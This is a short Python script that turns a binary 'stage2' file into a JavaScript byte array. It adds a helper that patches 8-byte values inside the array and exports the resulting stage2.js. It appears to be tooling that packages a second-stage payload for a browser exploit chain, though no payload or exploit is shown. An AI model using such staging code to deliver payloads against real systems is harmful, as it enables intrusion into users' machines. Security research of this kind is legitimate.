#!/usr/bin/env python3

import subprocess

payload = open('stage2', 'rb').read()

js = 'var stage2 = new Uint8Array(['
js += ','.join(map(str, payload))
js += ']);\n'

js += '''
stage2.replace = function(oldVal, newVal) {
    for (var idx = 0; idx < this.length; idx++) {
        var found = true;
        for (var j = idx; j < idx + 8; j++) {
            if (this[j] != oldVal.byteAt(j - idx)) {
                found = false;
                break;
            }
        }
        if (found)
            break;
    }
    this.set(newVal.bytes(), idx);
};
'''

with open('stage2.js', 'w') as f:
    f.write(js)

EXPORTS = [
        {'path': 'stage2.js', 'content_type': 'text/javascript; charset=UTF-8'}
]

subprocess.run(['cp', 'stage2.js', '..'], check=True)
